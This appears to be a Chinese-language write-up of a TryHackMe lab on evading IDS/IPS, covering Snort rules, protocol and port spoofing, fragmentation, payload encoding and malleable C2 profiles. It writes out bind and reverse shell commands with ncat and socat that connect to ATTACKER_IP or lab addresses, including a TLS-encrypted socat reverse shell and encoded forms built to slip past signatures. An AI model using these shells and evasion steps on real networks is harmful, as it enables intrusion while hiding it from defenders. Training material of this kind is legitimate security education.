THM-网络安全解决方案

hybcx2024-08-212024-08-21

了解并尝试各种 IDS/IPS 规避技术，例如协议和有效负载操纵。

0x01 介绍

入侵检测系统（ IDS ）是检测网络或系统入侵的系统。我想到的一个类比是一名警卫正在观看来自不同安全摄像头的实时直播。他可以发现盗窃行为，但他无法独自阻止。然而，如果这名警卫可以联系另一名警卫并要求他们阻止强盗，那么侦查就变成了预防。入侵检测和防御系统 (IDPS) 或简称入侵防御系统 ( IPS ) 是一个可以检测和防止入侵的系统。

了解检测和预防之间的区别至关重要。 Snort是一个网络入侵检测和入侵防御系统。因此，Snort 可以设置为IDS或IPS 。为了使 Snort 发挥IPS 的作用，它需要某种机制来阻止（ drop ）违规连接。此功能要求将 Snort 设置为inline并桥接两个或多个网卡。

作为一种基于签名的网络IDS ，Snort如下图所示。

下图显示了如果设置为内联，如何将 Snort 配置为IPS 。

IDS设置可以根据其在网络中的位置分为：

  1. 基于主机的IDS ( HIDS )
  2. 基于网络的入侵检测系统（ NIDS ）

基于主机的IDS (HIDS) 与其他正在运行的应用程序一起安装在操作系统上。此设置将使HIDS能​​够监控进出主机的流量；此外，它还可以监控主机上运行的进程。

基于网络的IDS ( NIDS ) 是用于监控网络流量的专用设备或服务器。应连接NIDS ，以便它可以监控我们想要保护的网络或 VLAN 的所有网络流量。这可以通过将NIDS连接到交换机上的监控端口来实现。 NIDS将处理网络流量以检测恶意流量。

0x02 IDS 引擎类型

我们可以将网络流量分为：

  1. 良性流量：这是我们期望拥有的通常流量，并且不希望IDS向我们发出警报。
  2. 恶意流量：这是我们不希望在正常情况下看到的异常流量，因此希望IDS能​​够检测到它。

就像我们可以对网络流量进行分类一样，我们也可以对主机活动进行分类。 IDS检测引擎要么围绕检测恶意流量和活动而构建，要么围绕识别正常流量和活动而构建。认识到“正常”可以很容易地发现任何与正常的偏差。

因此， IDS的检测引擎可以是：

  1. 基于签名：基于签名的IDS需要充分了解恶意（或不需要的）流量。换句话说，我们需要明确地向基于签名的检测引擎提供恶意流量的特征。可以使用明确的规则进行匹配来向IDS传授有关恶意流量的信息。
  2. 基于异常：这要求IDS了解常规流量的情况。换句话说，我们需要“教导” IDS什么是正常的，以便它能够识别什么是不正常的。可以使用机器学习或手动规则来向IDS教授正常流量（即基线流量）。

换句话说，基于签名的IDS可以识别恶意流量，因此所有非恶意的内容都被视为良性（正常）。这种方法常见于防病毒软件中，该软件具有已知病毒签名的数据库。任何与签名匹配的内容都会被检测为病毒。

基于异常的IDS可以识别正常流量，因此任何偏离正常的流量都被视为恶意流量。这种方法更类似于人类感知事物的方式；当您启动 Web 浏览器时，您对速度、性能和响应能力有一定的期望。换句话说，您知道您的浏览器的“正常”是什么。如果您突然发现您的网络浏览器太慢或没有响应，您就会知道出了问题。换句话说，当浏览器的性能偏离正常时，您就知道了。

0x03 IDS/IPS 触发

每个IDS / IPS都有一定的语法来编写其规则。例如，Snort 的规则使用以下格式： Rule Header (Rule Options) ，其中Rule Header构成：

  1. Action（行为）: 操作示例包括alert 、 log 、 pass 、 drop和reject 。
  2. Protocol（协议）: TCP, UDP, ICMP, or IP.
  3. Source IP/Source Port: !10.10.0.0/16 any指的是 B 类子网10.10.0.0/16以外的所有内容。
  4. Direction of Flow（流向）: ->表示从左（源）到右（目的地），而<>表示双向流量。
  5. Destination IP/Destination Port: 10.10.0.0/16 any指 B 类子网10.10.0.0/16 。

以下是drop所有通过 Snort IPS 的ICMP 流量的示例规则：

drop icmp any any -> any any (msg: "ICMP Ping Scan"; dsize:0; sid:1000020; rev: 1;)

上述规则指示 Snort IPS丢弃从任何源 IP 地址（在任何端口上）到任何目标 IP 地址（在任何端口上）的任何 ICMP 类型数据包。要添加到日志中的消息是“ICMP Ping Scan”。

让我们考虑一个假设的情况，我们的 Web 服务器中发现了一个漏洞。该漏洞存在于我们的 Web 服务器处理HTTP POST 方法请求的方式中，从而允许攻击者运行系统命令。

让我们考虑以下“天真的”方法。我们希望创建一个 Snort 规则来检测与我们的网络服务器交换的流量的有效负载中的术语ncat ，以了解人们如何利用此漏洞。

alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"ncat"; sid: 1000030; rev:1;)

上面的规则检查与端口 80 交换的数据包内容中的字符串ncat 。或者，您可以选择以十六进制格式写入 Snort 将扫描的内容。 ASCII 中的ncat十六进制写为6e 63 61 74 ，由 2 个管道字符封装为字符串| 。

alert tcp any any <> any 80 (msg: "Netcat Exploitation"; content:"|6e 63 61 74|"; sid: 1000031; rev:1;)

如果我们希望在HTTP POST 请求中看到它，我们可以进一步完善它。请注意， flow:established告诉 Snort 引擎查看由TCP 3 次握手（已建立的连接）启动的流。

alert tcp any any <> any 80 (msg: "Netcat Exploitation"; flow:established,to_server; content:"POST"; nocase; http_method; content:"ncat"; nocase; sid:1000032; rev:1;)

关于基于签名的IDS及其规则，有几点需要说明。如果攻击者进行哪怕最轻微的更改以避免在其有效负载中逐字使用ncat ，攻击就会被忽视。正如我们可以得出的结论，基于签名的IDS或IPS受限于其签名（规则）的编写和更新程度。我们在下一个任务中讨论一些规避技术。

0x04 通过协议进行规避

规避基于签名的IDS /IPS 需要您操纵流量，使其与任何IDS /IPS 签名不匹配。您可以考虑使用以下四种规避IDS / IPS系统的通用方法。

  1. 通过协议操纵进行规避
  2. 通过payload操纵进行规避
  3. 通过路由操纵进行规避
  4. 通过战术拒绝服务 ( DoS ) 进行规避

这个房间重点讨论使用nmap和ncat / socat进行规避。与 Nmap 相关的规避技术在防火墙室中进行了详细讨论。这个房间将在适当的情况下强调ncat和socat 。

我们将在各自的任务中扩展这些方法。让我们从第一个开始。通过协议操纵进行的规避包括：

  • 依赖不同的协议
  • 操纵（源）TCP/ UDP端口
  • 使用会话拼接（IP 数据包分段）
  • 发送无效数据包

依赖不同的协议

IDS /IPS 系统可能配置为阻止某些协议并允许其他协议。例如，您可能会考虑使用 UDP 而不是 TCP，或者依赖HTTP而不是DNS来进行攻击或窃取数据。您可以使用收集到的有关目标的知识以及目标组织所需的应用程序来设计攻击。例如，如果允许网页浏览，通常意味着受保护的主机可以连接到端口 80 和 443，除非使用本地代理。在一个案例中，客户依赖 Google 服务来开展业务，因此攻击者使用 Google 网络托管来隐藏其恶意网站。不幸的是，它并不是一刀切的。此外，只要不产生太多噪音，一些尝试和错误可能是必要的。

我们设置了一个 IPS 来阻止 DNS 查询和HTTP请求，如下图所示。特别是，它强制执行本地计算机不能查询外部 DNS 服务器而应查询本地 DNS 服务器的策略；此外，它还强制执行安全的HTTP通信。对于 HTTPS 来说，它是相对宽松的。在这种情况下，使用 HTTPS 来传输流量看起来是一种逃避IPS 的有前途的方法。

考虑您使用Ncat的情况。 Ncat默认使用TCP连接；但是，您可以使用选项-u让它使用UDP 。

  • 要使用TCP进行监听，只需发出ncat -lvnp PORT_NUM ，其中端口号是您要监听的端口。
  • 要连接到侦听TCP端口的 Ncat 实例，您可以发出ncat TARGET_IP PORT_NUM

注意：

  • -l告诉ncat监听传入的连接
  • -v当ncat绑定到源端口并接收连接时获得更详细的输出
  • -n避免解析主机名
  • -p指定ncat将侦听的端口号

如前所述，使用-u将通过UDP移动所有通信。

  • 要使用UDP进行监听，只需发出ncat -ulvnp PORT_NUM ，其中端口号是您要监听的端口。请注意，除非您添加-u ，否则ncat将默认使用TCP 。
  • 要连接到侦听UDP端口的 Ncat 实例，您可以发出nc -u TARGET_IP PORT_NUM

考虑以下两个示例：

  • 在攻击者系统上运行ncat -lvnp 25并连接到它会给人留下这是与 SMTP 服务器的普通 TCP 连接的印象，除非IDS / IPS提供深度数据包检查 ( DPI )。
  • 在攻击者机器上执行ncat -ulvnp 162并连接到它会产生一种错觉，认为这是与 SNMP 服务器的常规 UDP 通信，除非IDS / IPS支持DPI 。

操作 (源) TCP/UDP

一般来说，即使是最基本的安全解决方案也会检查 TCP 和UDP源端口和目标端口。在没有深度数据包检测的情况下，端口号是所使用服务的主要指标。换句话说，涉及TCP端口 22 的网络流量将被解释为 SSH 流量，除非安全解决方案可以分析TCP段携带的数据。

根据目标安全解决方案，您可以使端口扫描流量类似于 Web 浏览或DNS查询。如果您使用Nmap ，您可以添加选项-g PORT_NUMBER （或--source-port PORT_NUMBER ）以使Nmap从特定源端口号发送所有流量。

扫描目标时，使用nmap -sS -Pn -g 80 -F 10.10.78.49使端口扫描流量乍一看像是与HTTP服务器交换的。

如果您有兴趣扫描UDP端口，可以使用nmap -sU -Pn -g 53 -F 10.10.78.49使流量看起来像是与DNS服务器交换。

考虑您使用Ncat的情况。您可以尝试将流量伪装成某些DNS流量。

  • 在攻击者计算机上，如果您想使用 Ncat 侦听UDP端口 53（就像DNS服务器一样），您可以使用ncat -ulvnp 53 。
  • 在目标上，您可以使用ncat -u ATTACKER_IP 53使其连接到侦听服务器。

或者，您可以使其看起来更像是客户端与HTTP服务器进行通信的 Web 流量。

  • 在攻击者机器上，要让 Ncat 监听TCP端口 80，就像良性 Web 服务器一样，可以使用ncat -lvnp 80 。
  • 在目标上，使用nc ATTACKER_IP 80连接到侦听服务器。

使用会话拼接（IP 数据包分段）

IPv4 中另一种可能的方法是IP 数据包分段，即会话拼接。假设如果将与攻击相关的数据包分解为更小的数据包，您将避免匹配IDS签名。如果IDS正在寻找特定的字节流来检测恶意负载，请将负载分成多个数据包。除非IDS重新组装数据包，否则不会触发该规则。

Nmap提供了一些对数据包进行分段的选项。您可以添加：

  • -f将IP数据包中的数据设置为8字节。
  • -ff将IP数据包中的数据限制为最多16字节。
  • --mtu SIZE为 IP 数据包中携带的数据提供自定义大小。大小应该是 8 的倍数。

假设您想强制将所有数据包分段为特定大小。在这种情况下，您应该考虑使用Fragroute等程序。 fragroute可以设置为从给定的配置文件中读取一组规则并将它们应用于传入的数据包。对于简单的 IP 数据包分段，使用ip_frag SIZE的配置文件根据提供的大小对 IP 数据进行分段就足够了。大小应该是 8 的倍数。

例如，您可以创建一个配置文件fragroute.conf ，其中包含一行ip_frag 16 ，以对 IP 数据片段不超过 16 字节的数据包进行分段。然后您将运行命令fragroute -f fragroute.conf HOST 。主机是我们将分段数据包发送到的目的地。

发送无效数据包

一般来说，系统对有效数据包的响应往往是可预测的。然而，尚不清楚系统如何响应无效数据包。例如， IDS / IPS可能会处理无效数据包，而目标系统可能会忽略它。确切的行为需要一些实验或内部知识。

Nmap可以通过多种方式创建无效数据包。特别是，两个常见的选项是使用具有以下功能的数据包扫描目标：

  • Invalid TCP/UDP checksum：TCP/ UDP校验和无效
  • Invalid TCP flags：无效的TCP标志

Nmap 允许您使用选项--badsum发送带有错误 TCP/ UDP校验和的数据包。不正确的校验和表明原始数据包在其发送程序的路径上的某个地方已被更改。

Nmap 还允许您发送带有自定义TCP标志的数据包，包括无效标志。选项--scanflags允许您选择要设置的标志。

  • URG紧急
  • ACK表示确认
  • PSH推送
  • RST复位
  • SYN用于同步
  • FIN代表完成

例如，如果您想同时设置同步、重置和完成标志，则可以使用--scanflags SYNRSTFIN ，尽管这种组合可能对您的目的没有好处。

如果您想使用自定义字段（无论有效还是无效）制作数据包，您可能需要考虑使用hping3等工具。我们将列出一些示例选项，让您了解使用hping3制作数据包。

  • -t或--ttl设置 IP 标头中的生存时间
  • -b或--badsum发送UDP / TCP校验和错误的数据包
  • -S 、 -A 、 -P 、 -U 、 -F 、 -R分别设置TCP SYN、ACK、PUSH、URG、FIN 和 RST 标志

还有无数其他选择。根据您的需要，您可能需要查看hping3手册页以获取完整列表。

  • -sX for Xmas Scan
  • -sF for FIN Scan
  • -sNfor Null Scan

0x05 通过payload进行规避

通过有效负载操纵进行的规避包括：

  • 对有效负载进行混淆和编码
  • 加密通信通道
  • 修改shellcode

对payload进行混淆和编码

由于IDS规则非常具体，因此您可以进行细微更改以避免检测。这些变化包括添加额外的字节、混淆攻击数据以及加密通信。

考虑命令ncat -lvnp 1234 -e /bin/bash ，其中ncat将侦听 TCP 端口 1234 并将任何传入连接连接到 Bash shell。您可以将一些常见的转换应用于您的命令，例如 Base64、URL 编码和 Unicode 转义序列，以避免触发IDS / IPS签名。

编码为 Base64 格式

您可以使用众多在线工具之一将您的输入编码为 Base64。或者，您可以使用Linux系统上常见的base64 。

pentester@TryHackMe$ cat input.txt
ncat -lvnp 1234 -e /bin/bash
$ base64 input.txt
bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA==

ncat -lvnp 1234 -e /bin/bash编码为bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== 。

网址编码

URL 编码将某些字符转换为 %HH 形式，其中 HH 是十六进制 ASCII 表示形式。英文字母、句点、破折号和下划线不受影响。您可以参考RFC 3986 中的 2.4 节以获取更多信息。

urlencode是您可以轻松安装在Linux系统上的一个实用程序；或者，您可以使用在线服务或在 MS Windows 和 macOS 上搜索类似的实用程序。要继续使用 AttackBox，您可以通过运行命令apt install gridsite-clients安装urlencode 。

pentester@TryHackMe$ urlencode ncat -lvnp 1234 -e /bin/bash
ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash

ncat -lvnp 1234 -e /bin/bash URL编码后变为ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash 。根据IDS / IPS签名的匹配情况，URL 编码可能有助于逃避检测。

使用转义 Unicode

如果您使用转义 Unicode，某些应用程序仍会处理您的输入并正确执行它。有多种方法可以使用转义 Unicode，具体取决于处理输入字符串的系统。例如，您可以使用CyberChef选择并配置转义 Unicode 字符配方，如下图所示。

  1. 搜索转义 Unicode 字符
  2. 将其拖至配方列
  3. 确保在“使用 \u 前缀编码所有字符”旁边打勾
  4. 确保大写十六进制附近有一个复选标记，填充为 4

如果您使用格式\uXXXX ，则ncat -lvnp 1234 -e /bin/bash变为\u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068 。假设目标系统能够正确解释并执行它，这显然是一个巨大的转换，可以帮助您逃避检测。

加密通信通道

由于IDS / IPS不会检查加密数据，因此攻击者可以利用加密来逃避检测。与编码不同，加密需要加密密钥。

一种直接的方法是在攻击者的系统上创建必要的加密密钥，并将socat设置为使用该加密密钥在侦听传入连接时强制加密。加密的反向shell可以分三步进行：

  1. 创建密钥
  2. 在攻击者的机器上监听
  3. 连接到攻击者的机器

首先，在AttackBox或任何Linux系统上，我们可以使用openssl创建密钥。

openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

上述命令中的参数是：

  • req表示这是一个证书签名请求。显然，我们不会提交证书进行签名。
  • -x509指定我们需要 X.509 证书
  • -newkey rsa:4096使用 RSA 创建新的证书请求和新的私钥，密钥大小为 4096 位。 （您可以使用其他 RSA 密钥大小选项，例如-newkey rsa:2048 。）
  • -days 365表明我们的证书有效期为一年
  • -subj通过命令行设置数据，例如组织和国家/地区。
  • -nodes简化了我们的命令并且不加密私钥
  • -keyout PRIVATE_KEY指定我们要保存私钥的文件名
  • -out CERTIFICATE指定我们要写入证书请求的文件名

上述命令返回：

  • Private key: thm-reverse.key
  • Certificate: thm-reverse.crt

隐私增强邮件 (PEM) .pem文件需要连接私钥.key和证书.crt文件。我们可以使用cat从我们刚刚创建的两个文件创建我们的 PEM 文件：

cat thm-reverse.key thm-reverse.crt > thm-reverse.pem 。

其次，准备好 PEM 文件后，我们可以开始监听，同时使用密钥加密与客户端的通信。

socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

如果您不熟悉socat ，我们使用的选项是：

  • -d -d提供一些调试数据（致命、错误、警告和通知消息）
  • OPENSSL-LISTEN:PORT_NUM表示连接将使用 OPENSSL 加密
  • cert=PEM_FILE提供PEM文件（证书和私钥）以建立加密连接
  • verify=0禁用检查对等方的证书
  • fork创建一个子进程来处理每个新连接。

第三，在受害者系统上， socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash 。请注意， EXEC调用指定的程序。

让我们来演示一下。在攻击者系统上，我们执行了以下操作：

然而，如果IDS / IPS检查流量，则所有数据包数据都将被加密。换句话说， IPS将完全忽略交换流量和命令（例如cat /etc/passwd 。下面的屏幕截图显示了使用 Wireshark 捕获时线路上的情况。突出显示的数据包包含cat /etc/passwd ；但是，它是加密的。

  1. 在攻击者的系统上，我们运行socat -d -d TCP -LISTEN:4443,fork STDOUT 。
  2. 在受害者的机器上，我们运行socat TCP :10.20.30.129:4443 EXEC:/bin/bash 。

修改数据

考虑一个简单的情况，您想要使用 Ncat 创建绑定 shell。以下命令ncat -lvnp 1234 -e /bin/bash告诉ncat侦听TCP端口 1234 并将 Bash shell 绑定到该端口。如果您想检测包含此类命令的数据包，您需要考虑一些特定的内容来匹配签名，但不要太具体。

  • 通过更改标志的顺序可以轻松规避ncat -lvnp扫描。
  • 另一方面，可以通过添加额外的空白（例如 ncat -）来避免检查ncat -，它仍然可以在目标系统上正确运行。
  • 如果IDS正在寻找ncat ，那么对原始命令的简单更改将不会逃避检测。我们需要根据目标系统/应用程序考虑更复杂的方法。一种选择是使用不同的命令，例如nc或socat 。或者，如果目标系统可以正确处理，您可以考虑使用不同的编码。

0x06 通过路由进行规避

通过路由操纵进行规避包括：

  • 依赖源路由
  • 使用代理服务器

依赖源路由

在许多情况下，您可以使用源路由来强制数据包使用特定路由到达目的地。 Nmap使用选项--ip-options提供此功能。 Nmap提供宽松和严格的路由：

  • 可以使用L指定松散路由。例如， --ip-options "L 10.10.10.50 10.10.50.250"请求扫描数据包通过提供的两个 IP 地址进行路由。
  • 可以使用S指定严格路由。严格路由要求您设置系统和目标主机之间的每一跳。例如， --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3"指定数据包在到达目标主机之前经过这三跳。

使用代理服务器

使用代理服务器可以帮助隐藏您的来源。 Nmap提供了选项--proxies ，它采用逗号分隔的代理 URL 列表。每个 URL 应以proto://host:port格式表示。有效协议为HTTP和 SOCKS4；此外，目前不支持身份验证。

考虑以下示例。您可以将Nmap命令编辑为类似nmap -sS HTTP ://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 10.10.78.49 ，而不是运行nmap -sS 10.10.78.49 。这样，您的扫描将先通过HTTP代理主机 1，然后通过 SOCKS4 代理主机 2，最后到达目标。需要注意的是，找到可靠的代理需要进行一些尝试和错误，然后才能依靠它来隐藏Nmap扫描源。

如果您使用网络浏览器连接到目标，那么通过代理服务器传递流量将是一个简单的任务。其他网络工具通常提供自己的代理设置，您可以使用它们来隐藏流量来源。

0x07 通过 DoS 进行规避

通过战术DoS进行规避包括：

  • 针对IDS / IPS发起DoS
  • 针对日志服务器发起DoS

随着规则数量的增加和网络流量的增加， IDS /IPS 需要较高的处理能力。此外，特别是在IDS的情况下，主要响应是记录与签名匹配的流量信息。因此，如果您能够：

  • 创建大量的良性流量，只会使IDS / IPS的处理能力超载。
  • 创建大量非恶意流量，这些流量仍会进入日志。此操作会堵塞与日志服务器的通信通道或超出其磁盘写入能力。

还值得注意的是，攻击的目标可能是IDS运营商。通过造成大量误报，您可能会导致操作员对“对手”感到疲劳。

0x08 C2 和 IDS/IPS 规避

Cobalt Strike 和 Empire 等渗透测试框架提供可延展的命令和控制 (C2) 配置文件。这些配置文件允许进行各种微调以逃避IDS / IPS系统。如果您正在使用这样的框架，那么值得创建一个自定义配置文件，而不是依赖默认配置文件。您可以控制的示例变量包括：

  • 用户代理（User-Agent）：您正在使用的工具或框架可以通过其默认设置的用户代理向您公开。因此，将用户代理设置为无害的内容并进行测试以确认您的设置始终很重要。
  • 睡眠时间（Sleep Time）：睡眠时间允许您控制信标签入之间的回调间隔。换句话说，您可以控制受感染系统尝试连接到控制系统的频率。
  • 抖动（Jitter）：此变量可让您向睡眠时间添加一些随机性，由抖动百分比指定。 30% 的抖动会导致 ±30% 的睡眠时间，以进一步逃避检测。
  • SSL 证书（SSL Certificate）：使用看起来真实的 SSL 证书将显着提高您逃避检测的机会。这是非常值得的时间投资。
  • DNS Beacon ：考虑使用DNS协议来窃取数据的情况。您可以通过在DNS查询中设置DNS服务器和主机名来微调DNS信标。主机名将保存泄露的数据。

此CobaltStrike 指南配置文件展示了如何将配置文件组合在一起。

0x09 下一代安全

根据Gartner 的数据，下一代网络 IPS (NGNIPS) 具有以下五个特征：

  1. 标准的第一代IPS能力：下一代网络IPS应该实现传统网络IPS的能力。
  2. 应用程序感知和全栈可见性：识别来自各种应用程序的流量并强制执行网络安全策略。 NGNIPS 必须能够理解应用层。
  3. 情境感知：使用IPS外部来源的信息来帮助做出阻止决策。
  4. 内容感知：能够检查和分类入站和出站流量中的文件，例如可执行程序和文档。
  5. 敏捷引擎：支持升级路径以从新的信息源中受益。

由于下一代防火墙 (NGFW) 提供与 IPS 相同的功能，因此 NGNIPS 一词似乎因 NGFW 的缘故而不再受欢迎。您可以在红队防火墙室中阅读有关 NGFW 的更多信息。

总结

在这个房间中，我们根据安装位置和检测引擎介绍了IDS和 IPS 类型。我们还考虑了 Snort 2 规则作为IDS规则如何触发的示例。为了逃避检测，需要收集尽可能多的有关已部署设备的信息并尝试不同的技术。换句话说，除非完全了解安全设备及其配置，否则尝试和错误可能是不可避免的。

使用命令和控制 (C2) 框架通过控制流量的形状，使其尽可能无害，从而为IPS规避做出贡献。 C2配置文件是一项关键功能，如果使用任何支持可延展配置文件的C2框架，则应该学习掌握这一功能。
